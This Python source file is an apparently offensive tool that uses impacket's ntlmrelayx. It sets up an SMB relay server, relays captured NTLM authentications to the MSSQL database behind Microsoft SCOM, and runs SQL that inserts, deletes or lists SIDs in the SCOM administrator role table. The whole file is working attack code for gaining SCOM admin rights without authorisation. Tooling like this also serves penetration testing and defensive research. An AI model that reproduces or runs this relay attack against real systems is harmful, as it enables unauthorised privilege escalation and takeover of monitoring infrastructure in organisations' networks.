import time
from threading import Lock
from struct import unpack

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ldap import ldaptypes
from impacket.tds import TDS_ERROR_TOKEN, TDS_INFO_TOKEN, TDS_LOGINACK_TOKEN, TDS_ROW_TOKEN

from lib.logger import logger


class SCOMMSSQLRelayClient(MSSQLRelayClient):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.scom_relay = None


class SCOMMSSQLAttackClient(ProtocolAttack):
    def run(self):
        self.scom_relay.attack_lock.acquire()
        try:
            self._run()
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
        finally:
            self.scom_relay.attack_lock.release()

    def _run(self):
        if (hasattr(self.client, 'username')
            and self.client.username in self.scom_relay.attacked_targets
        ):
            logger.debug(
                "Skipping user %s since attack was already performed"
                % repr(self.client.username)
            )
            return

        try:
            # Get the username for logging
            username = getattr(self.client, 'username', 'Unknown')
            logger.info(f"Authenticated as: {username}")

            # Execute the appropriate query based on operation mode
            if self.scom_relay.operation_mode == 'list':
                logger.info("Listing current members of SCOM admin role...")
                result = self.execute_query(self.scom_relay.query)
                self.handle_list_result(result)
            elif self.scom_relay.operation_mode == 'delete':
                logger.info(f"Removing SID from SCOM admin role...")
                result = self.execute_query(self.scom_relay.query)
                self.handle_modify_result(result, "removed from")
            else:  # update/insert mode
                logger.info(f"Adding SID to SCOM admin role...")
                result = self.execute_query(self.scom_relay.query)
                self.handle_modify_result(result, "added to")

        except Exception as e:
            logger.info(f"An error occurred during the relay: \n{str(e)}")

        # Mark attack as complete
        self.finish_run()

    def execute_query(self, query):
        """Execute SQL query and return results"""
        try:
            logger.debug(f"Executing query: {query}")
            self.client.sql_query(query)
            
            # Get the response
            results = []
            self.client.printReplies()
            self.client.colMeta = []
            self.client.printRows()
            
            return results
        except Exception as e:
            logger.info(f"Error executing query: {str(e)}")
            return None

    def handle_list_result(self, result):
        """Handle results from listing role members"""
        logger.info("\n[+] Current members of SCOM admin role (RoleID = 1):")
        logger.info("=" * 60)
        
        # The results will be printed by impacket's printRows()
        # We just need to provide context
        logger.info("\nQuery completed successfully")

    def handle_modify_result(self, result, action):
        """Handle results from insert/delete operations"""
        logger.info(f"\n[+] SID successfully {action} SCOM admin role")
        logger.info(f"[+] Target user should now {'have' if action == 'added to' else 'lose'} SCOM administrator privileges")

    def finish_run(self):
        """Mark the attack as complete and potentially shut down"""
        if hasattr(self.client, 'username'):
            self.scom_relay.attacked_targets.append(self.client.username)
        self.scom_relay.shutdown()


class MSSQLSCOMRELAY:
    def __init__(self, target: str, sid: str, interface: str, port: int, 
                 timeout: int, operation_mode: str, verbose: bool):
        self.target = target
        self.sid = sid
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.operation_mode = operation_mode
        self.verbose = verbose
        self.attacked_targets = []
        self.attack_lock = Lock()
        self.server = None
        self.query = None

        # Build the appropriate SQL query based on operation mode
        self.query = self.build_query()

        # Ensure target has proper format
        if not self.target.startswith("mssql://"):
            self.target = f"mssql://{self.target}"
        
        logger.info(f"Targeting MSSQL server at {self.target}")
        logger.info(f"Operation mode: {self.operation_mode}")

        # Set up the relay configuration
        target_processor = TargetsProcessor(
            singleTarget=self.target,
            protocolClients={"MSSQL": self.get_relay_mssql_client}
        )

        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setAttacks({"MSSQL": self.get_attack_mssql_client})
        config.setProtocolClients({"MSSQL": self.get_relay_mssql_client})
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support = True
        config.setMode("RELAY")
        config.setOutputFile(None)

        self.server = SMBRelayServer(config)

    def convert_string_sid(self, sid):
        """Convert string SID to hex format for SQL query"""
        try:
            hexsid = ldaptypes.LDAP_SID()
            hexsid.fromCanonical(sid)
            querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
            logger.info(f'[*] Converted {sid} to {querysid}')
            return querysid
        except Exception as e:
            logger.info(f"Error converting SID: {str(e)}")
            return None

    def build_query(self):
        """Build the appropriate SQL query based on operation mode"""
        if self.operation_mode == 'list':
            query = "Use OperationsManager; SELECT * FROM AzMan_Role_SIDMember WHERE RoleID = 1;"
            logger.debug(f"Built list query: {query}")
            return query
        
        # For insert/delete, we need to convert the SID
        if not self.sid:
            logger.info("Error: SID is required for insert/delete operations")
            return None

        # Check if SID is already in hex format
        if self.sid.startswith("0x"):
            hex_sid = self.sid
            logger.info(f"[*] Using provided hex SID: {hex_sid}")
        else:
            hex_sid = self.convert_string_sid(self.sid)
            if not hex_sid:
                return None

        if self.operation_mode == 'delete':
            query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {hex_sid};"
        else:  # update/insert mode
            query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {hex_sid});"
        
        logger.debug(f"Built query: {query}")
        return query

    def start(self):
        """Start the relay server"""
        if not self.query:
            logger.info("Error: Failed to build SQL query. Exiting.")
            return

        logger.info(f"Listening on {self.interface}:{self.port}")
        logger.info("Waiting for incoming connections...")
        logger.info(f"Query ready: {self.query}")

        self.server.start()

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt, exiting...")
            self.shutdown()
        except Exception as e:
            logger.debug(e)

    def get_relay_mssql_client(self, *args, **kwargs):
        relay_client = SCOMMSSQLRelayClient(*args, **kwargs)
        relay_client.scom_relay = self
        return relay_client

    def get_attack_mssql_client(self, *args, **kwargs):
        attack_client = SCOMMSSQLAttackClient(*args, **kwargs)
        attack_client.scom_relay = self
        return attack_client

    def shutdown(self):
        logger.info("Job done...")
        exit()